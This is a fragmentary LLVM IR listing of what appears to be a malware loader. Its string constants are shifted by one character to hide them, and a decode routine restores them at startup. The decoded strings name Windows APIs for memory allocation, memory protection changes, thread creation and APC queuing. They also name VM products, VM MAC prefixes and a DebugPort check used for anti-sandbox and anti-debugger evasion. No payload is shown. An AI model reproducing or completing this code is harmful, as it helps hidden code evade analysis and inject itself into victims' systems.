...
@.str = private unnamed_addr global [13 x i8] c"lfsofm43/emm\01", align 1
...
@.str.1 = private unnamed_addr global [15 x i8] c"HfuQspdBeesftt\01", align 1
@ptrGetProcAddress = dso_local global ptr null, align 8
@.str.2 = private unnamed_addr global [13 x i8] c"MpbeMjcsbszB\01", align 1
@ptrLoadLibraryA = dso_local global ptr null, align 8
@.str.3 = private unnamed_addr global [21 x i8] c"ntwds231`dms1511/emm\01", align 1
@msvcr120_clr0400_mod = dso_local global ptr null, align 8
@kernel32_mod = dso_local global ptr null, align 8
@.str.4 = private unnamed_addr global [7 x i8] c"nfndqz\01", align 1
@.str.5 = private unnamed_addr global [12 x i8] c"DmptfIboemf\01", align 1
@CloseHandle_ptr = dso_local global ptr null, align 8
@.str.6 = private unnamed_addr global [15 x i8] c"WjsuvbmQspufdu\01", align 1
@.str.7 = private unnamed_addr global [20 x i8] c"XbjuGpsTjohmfPckfdu\01", align 1
@WaitForSingleObject_ptr = dso_local global ptr null, align 8
@.str.8 = private unnamed_addr global [8 x i8] c"TmffqFy\01", align 1
@.str.9 = private unnamed_addr global [13 x i8] c"SftvnfUisfbe\01", align 1
@ResumeThread_ptr = dso_local global ptr null, align 8
@.str.10 = private unnamed_addr global [7 x i8] c"qsjoug\01", align 1
@printf_ptr = dso_local global ptr null, align 8
@.str.11 = private unnamed_addr global [13 x i8] c"RvfvfVtfsBQD\01", align 1
@.str.12 = private unnamed_addr global [13 x i8] c"WjsuvbmBmmpd\01", align 1
@.str.13 = private unnamed_addr global [13 x i8] c"DsfbufUisfbe\01", align 1
@CreateThread_ptr = dso_local global ptr null, align 8
@.str.14 = private unnamed_addr global [18 x i8] c"ejeo(u!rvfvf!BQD\0B\01", align 1
@debuggerDetected = dso_local global i32 1, align 4
@.str.15 = private unnamed_addr global [7 x i8] c"WNxbsf\01", align 1
@.str.1.16 = private unnamed_addr global [11 x i8] c"WjsuvbmCpy\01", align 1
@.str.2.17 = private unnamed_addr global [5 x i8] c"RFNV\01", align 1
@.str.3.18 = private unnamed_addr global [4 x i8] c"Yfo\01", align 1
@.str.4.19 = private unnamed_addr global [8 x i8] c"Izqfs.W\01", align 1
@.str.5.20 = private unnamed_addr global [13 x i8] c"jqimqbqj/emm\01", align 1
@.str.6.21 = private unnamed_addr global [16 x i8] c"HfuBebqufstJogp\01", align 1
@.str.7.22 = private unnamed_addr global [44 x i8] c"HfuBebqufstJogp!gbjmfe!up!hfu!cvggfs!tj{f/\0B\01", align 1
@.str.8.23 = private unnamed_addr global [27 x i8] c"Nfnpsz!bmmpdbujpo!gbjmfe/\0B\01", align 1
@.str.9.24 = private unnamed_addr global [45 x i8] c"HfuBebqufstJogp!gbjmfe!up!hfu!bebqufs!jogp/\0B\01", align 1
@.str.10.25 = private unnamed_addr global [30 x i8] c"&13Y;&13Y;&13Y;&13Y;&13Y;&13Y\01", align 1
@.str.11.26 = private unnamed_addr global [9 x i8] c"11;16;7:\01", align 1
@.str.12.27 = private unnamed_addr global [9 x i8] c"11;1D;3:\01", align 1
@.str.13.28 = private unnamed_addr global [9 x i8] c"19;11;38\01", align 1
@.str.14.29 = private unnamed_addr global [9 x i8] c"11;61;67\01", align 1
@.str.15.30 = private unnamed_addr global [5 x i8] c"WCpy\01", align 1
@.str.16 = private unnamed_addr global [4 x i8] c"LWN\01", align 1
@.str.31 = private unnamed_addr global [10 x i8] c"ouemm/emm\01", align 1
@.str.1.32 = private unnamed_addr global [26 x i8] c"OuRvfszJogpsnbujpoQspdftt\01", align 1
@.str.2.33 = private unnamed_addr global [32 x i8] c"Efcvhhfs!efufdufe!)EfcvhQpsu*\22\0B\01", align 1
@0 = private unnamed_addr global [5 x i8] c"CZF\0B\01", align 1
...
define void @decode(ptr %ptr, i32 %len) {
entry:
  %ptrNotNull = icmp ne ptr %ptr, null
  %lenGtZero = icmp sgt i32 %len, 0
  %cond = and i1 %ptrNotNull, %lenGtZero
  br i1 %cond, label %loop, label %after

loop:                                             ; preds = %loop, %entry
  %curPtr = phi ptr [ %ptr, %entry ], [ %nextPtr, %loop ]
  %curLen = phi i32 [ %len, %entry ], [ %nextLen, %loop ]
  %curByte = load i8, ptr %curPtr, align 1
  %decodedByte = add i8 %curByte, -1
  store i8 %decodedByte, ptr %curPtr, align 1
  %nextPtr = getelementptr i8, ptr %curPtr, i64 1
  %nextLen = sub i32 %curLen, 1
  %loopCond = icmp sgt i32 %nextLen, 0
  br i1 %loopCond, label %loop, label %after
...
entry:
  call void @decode(ptr @.str, i32 13)
  call void @decode(ptr @.str.1, i32 15)
  call void @decode(ptr @.str.2, i32 13)
  call void @decode(ptr @.str.3, i32 21)
  call void @decode(ptr @.str.4, i32 7)
  call void @decode(ptr @.str.5, i32 12)
  call void @decode(ptr @.str.6, i32 15)
  call void @decode(ptr @.str.7, i32 20)
  call void @decode(ptr @.str.8, i32 8)
  call void @decode(ptr @.str.9, i32 13)
  call void @decode(ptr @.str.10, i32 7)
  call void @decode(ptr @.str.11, i32 13)
  call void @decode(ptr @.str.12, i32 13)
  call void @decode(ptr @.str.13, i32 13)
  call void @decode(ptr @.str.14, i32 18)
  call void @decode(ptr @.str.15, i32 7)
  call void @decode(ptr @.str.1.16, i32 11)
  call void @decode(ptr @.str.2.17, i32 5)
  call void @decode(ptr @.str.3.18, i32 4)
  call void @decode(ptr @.str.4.19, i32 8)
  call void @decode(ptr @.str.5.20, i32 13)
  call void @decode(ptr @.str.6.21, i32 16)
  call void @decode(ptr @.str.7.22, i32 44)
  call void @decode(ptr @.str.8.23, i32 27)
  call void @decode(ptr @.str.9.24, i32 45)
  call void @decode(ptr @.str.10.25, i32 30)
  call void @decode(ptr @.str.11.26, i32 9)
  call void @decode(ptr @.str.12.27, i32 9)
  call void @decode(ptr @.str.13.28, i32 9)
  call void @decode(ptr @.str.14.29, i32 9)
  call void @decode(ptr @.str.15.30, i32 5)
  call void @decode(ptr @.str.16, i32 4)
  call void @decode(ptr @.str.31, i32 10)
  call void @decode(ptr @.str.1.32, i32 26)
  call void @decode(ptr @.str.2.33, i32 32)
  call void @decode(ptr @0, i32 5)
  ret void
}
